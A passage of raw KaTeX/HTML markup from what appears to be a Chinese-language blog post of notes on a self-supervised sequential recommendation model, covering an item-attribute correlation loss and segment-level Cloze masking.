class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>L</mi><mrow><mi>M</mi><mi>A</mi><mi>P</mi></mrow></msub><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><msub><mi mathvariant=\"script\">H</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>a</mi><mo>∈</mo><msub><mi mathvariant=\"script\">H</mi><msub><mi>i</mi><mi>t</mi></msub></msub></mrow></msub><mo stretchy=\"false\">[</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><munder><mo>∑</mo><mrow><mover accent=\"true\"><mi>a</mi><mo>~</mo></mover><mo>∈</mo><mi mathvariant=\"script\">H</mi><mo>∖</mo><msub><mi mathvariant=\"script\">H</mi><mi>i</mi></msub></mrow></munder><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><mover accent=\"true\"><mi>a</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;L_{MAP}(C_{i_{t}},\\mathcal{H}_{i_{t}})\\\\&amp;=\\mathbb{E}_{a\\in\\mathcal{H}_{i_{t}}}[f(C_{i_{t}},a)-\\log\\sum_{\\tilde{a}\\in\\mathcal{H}\\setminus\\mathcal{H}_{i}}\\exp(f(C_{i_{t}},\\tilde{a}))],\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.36601em;vertical-align:-1.9330049999999996em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4330050000000005em;\"><span style=\"top:-4.64301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.9330050000000005em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9330049999999996em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4330050000000005em;\"><span style=\"top:-4.64301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-2.9330050000000005em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.328331em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:0em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.61508em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.27027999999999996em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33605714285714283em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.38523999999999997em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.808995em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span><span style=\"top:-3.0500000000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"mbin mtight\">∖</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.516005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\">]</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9330049999999996em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li>\n<p>其中的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(.,.)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span> 可以通过以下公式实现：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>σ</mi><mo fence=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mi mathvariant=\"normal\">⊤</mi></msubsup><mo>⋅</mo><msub><mi mathvariant=\"bold\">W</mi><mrow><mi>M</mi><mi>A</mi><mi>P</mi></mrow></msub><mo>⋅</mo><msub><mi mathvariant=\"bold\">e</mi><mi>a</mi></msub><mo fence=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(C_{i_t},a)=\\sigma\\big(\\mathbf{F}_t^\\top\\cdot\\mathbf{W}_{MAP}\\cdot\\mathbf{e}_a\\big)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2491179999999997em;vertical-align:-0.35001em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">⊤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.20001em;vertical-align:-0.35001em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">e</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"delimsizing size1\">)</span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>M</mi><mi>A</mi><mi>P</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">W_{MAP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是可学习参数矩阵</li>\n</ul>\n</li>\n<li>\n<p>我们希望明确地对相关性进行建模，以得出更有意义的监督信号</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"序列-片段相关性建模\"><a class=\"anchor\" href=\"#序列-片段相关性建模\">#</a> 序列 - 片段相关性建模</h3>\n<ul>\n<li>\n<p>项目序列与单词序列之间的主要区别在于，单个目标项目可能与周围上下文没有高度相关性 (如用户购买一个商品只是因为其在打折)</p>\n</li>\n<li>\n<p>基于此，我们将 Cloze 策略从单个条目扩展为条目子序列（即称为段）</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></mrow><annotation encoding=\"application/x-tex\">i_{j_1:j_2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9456279999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示从项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><msub><mi>j</mi><mn>1</mn></msub></msub><mtext>到</mtext><msub><mi>i</mi><msub><mi>j</mi><mn>2</mn></msub></msub></mrow><annotation encoding=\"application/x-tex\">i_{j_1}到i_{j_2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">到</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 的子序列，并且让<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub></mrow><annotation encoding=\"application/x-tex\">C_{i_{j_1:j_2}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.08325em;vertical-align:-0.39992em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 